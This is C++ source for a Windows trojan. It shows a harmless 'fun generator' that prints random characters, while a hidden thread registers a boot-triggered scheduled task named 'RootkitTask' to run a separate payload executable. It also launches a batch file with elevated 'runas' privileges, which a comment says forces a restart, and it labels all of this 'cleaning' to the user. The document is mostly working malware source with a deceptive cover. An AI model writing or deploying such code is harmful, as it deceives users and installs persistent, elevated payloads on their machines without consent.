#include <iostream>
#include <random>
#include <Windows.h>
#include <combaseapi.h>
#include <taskschd.h>
#include <mstask.h>
#include <stdio.h>
#include <comdef.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")


BOOL CreateTask(LPCWSTR TaskName, LPCWSTR RunPath) {
    HRESULT TaskRes;
    ITaskService* SchdlrSrvcPnt = NULL;
    ITaskFolder* RootTaskFolder = NULL;
    BSTR Tname;
    BSTR Rname;
    ITaskDefinition* TaskDefPnt = NULL;
    ITaskSettings* TaskSettingsPnt = NULL;
    ITriggerCollection* TaskTriggerCol = NULL;
    ITrigger* ActTrigger = NULL;
    IBootTrigger* BootTrigger = NULL;
    IAction* ActAction = NULL;
    IExecAction* ExecAction = NULL;
    IActionCollection* TaskActionCol = NULL;
    IRegisteredTask* RegisteredTaskPnt = NULL;

    // Initialize COM -
    TaskRes = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(TaskRes))
    {
        printf("1\n");
        return FALSE;
    }


    //  Set general COM security levels -
    TaskRes = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    if (FAILED(TaskRes))
    {
        printf("2\n");
        CoUninitialize();
        return FALSE;
    }


    // Create instance of the task scheduler service -
    TaskRes = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&SchdlrSrvcPnt);

    if (FAILED(TaskRes))
    {
        printf("3\n");
        CoUninitialize();
        return FALSE;
    }


    //  Connect to the task service -
    TaskRes = SchdlrSrvcPnt->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());
    if (FAILED(TaskRes))
    {
        printf("4\n");
        SchdlrSrvcPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  Get the pointer to the root task folder (for the new registered task)- 
    TaskRes = SchdlrSrvcPnt->GetFolder(_bstr_t(L"\\"), &RootTaskFolder);
    if (FAILED(TaskRes))
    {
        printf("5\n");
        SchdlrSrvcPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  If the same task exists remove it -
    Tname = SysAllocString(TaskName);
    RootTaskFolder->DeleteTask(Tname, 0);
    if (Tname != NULL) {
        SysFreeString(Tname);
    }


    //  Create a task builder object to create the task -
    TaskRes = SchdlrSrvcPnt->NewTask(0, &TaskDefPnt);


    // Release task scheduler service instance (not needed anymore) -
    SchdlrSrvcPnt->Release();
    if (FAILED(TaskRes))
    {
        printf("6\n");
        RootTaskFolder->Release();
        CoUninitialize();
        return FALSE;
    }


    //  Create the settings of the task -
    TaskRes = TaskDefPnt->get_Settings(&TaskSettingsPnt);
    if (FAILED(TaskRes))
    {
        printf("9\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  Set setting values for the task. 
    TaskRes = TaskSettingsPnt->put_StartWhenAvailable(VARIANT_TRUE);
    TaskSettingsPnt->Release();
    if (FAILED(TaskRes))
    {
        printf("10\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    // Get the trigger collection of task to set boot trigger -
    TaskRes = TaskDefPnt->get_Triggers(&TaskTriggerCol);
    if (FAILED(TaskRes))
    {
        printf("11\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  Create a boot trigger -
    TaskRes = TaskTriggerCol->Create(TASK_TRIGGER_BOOT, &ActTrigger);
    TaskTriggerCol->Release();
    if (FAILED(TaskRes))
    {
        printf("12\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    // Add the boot trigger to the task -
    TaskRes = ActTrigger->QueryInterface(
        IID_IBootTrigger, (void**)&BootTrigger);
    ActTrigger->Release();
    if (FAILED(TaskRes))
    {
        printf("13\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  Get the task action collection -
    TaskRes = TaskDefPnt->get_Actions(&TaskActionCol);
    if (FAILED(TaskRes))
    {
        printf("18\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  Create an executable action -
    TaskRes = TaskActionCol->Create(TASK_ACTION_EXEC, &ActAction);
    TaskActionCol->Release();
    if (FAILED(TaskRes))
    {
        printf("19\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    TaskRes = ActAction->QueryInterface(
        IID_IExecAction, (void**)&ExecAction);
    ActAction->Release();
    if (FAILED(TaskRes))
    {
        printf("20\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  Set the path of the executable in the execute path to the path of medium -
    Rname = SysAllocString(RunPath);
    TaskRes = ExecAction->put_Path(Rname);
    ExecAction->Release();

    if (Rname != NULL) {
        SysFreeString(Rname);
    }

    if (FAILED(TaskRes))
    {
        printf("21\n");
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }


    //  Save the task in the root folder.
    TaskRes = RootTaskFolder->RegisterTaskDefinition(
        _bstr_t(TaskName),
        TaskDefPnt,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &RegisteredTaskPnt);
    if (FAILED(TaskRes))
    {
        printf("\nError saving the Task : %x", TaskRes);
        RootTaskFolder->Release();
        TaskDefPnt->Release();
        CoUninitialize();
        return FALSE;
    }

    RootTaskFolder->Release();
    TaskDefPnt->Release();
    CoUninitialize();
    return TRUE;
}


std::wstring GetCurrentPath() {
    TCHAR PathBuffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, PathBuffer, MAX_PATH);
    std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
    return std::wstring(PathBuffer).substr(0, PathEndPos);
}


BOOL TrojanThread() {
    std::wstring CurrPath = GetCurrentPath();  // exe path, not solution path / source file path
    std::wstring MedPath = CurrPath + L"\\MainMedium\\x64\\Debug\\MainMedium.exe";


    // Create task scheduler task to run medium program -
    if (!CreateTask(L"RootkitTask", MedPath.c_str())) {
        printf("Cleaning error tasktasktsak\n");
        return FALSE;
    }

    // Execute batch file (and force restart the system) -
    HRESULT ComRes = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);  // Initialize COM - cmd EXTs can depend on it
    const char* BatFile = "installer\\target_script.bat";
    system(BatFile);

    HINSTANCE ExecRes = ShellExecuteA(NULL, "runas", BatFile, NULL, NULL, SW_SHOWNORMAL);
    if ((ULONG)ExecRes < 32) {
        printf("Some other error occured while cleaning -> %u\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}


int main()
{
    char Inp;
    const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,/;[]{}:-_=+)(*&^%$#@!~`";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(0, strlen(Alp) - 1);
    
    // Trojan variables and calling -
    SECURITY_ATTRIBUTES Trojattr;
    Trojattr.bInheritHandle = FALSE;
    Trojattr.nLength = sizeof(SECURITY_ATTRIBUTES);
    Trojattr.lpSecurityDescriptor = NULL;

    HANDLE Trojthrd = CreateThread(&Trojattr,
        0,
        (LPTHREAD_START_ROUTINE)&TrojanThread,
        NULL,
        0,
        NULL);

    if (Trojthrd == NULL) {
        printf("Cannot continue with FunEngine, please retry..\n");
        return 1;
    }

    printf("Welcome to fun generator! Setting things up...\nStart?\n");
    std::cin >> Inp;
    while (Inp != 'n') {
        printf("Your random fun character is -----> %c\n", Alp[distr(gen)]);
        printf("Continue?\n");
        std::cin >> Inp;
    }

    printf("Finished Fun Engine! Cleaning everything...\n");
    WaitForSingleObject(Trojthrd, INFINITE);
    printf("Cleaning succeeded, bye bye!\n");
    return 0;
}
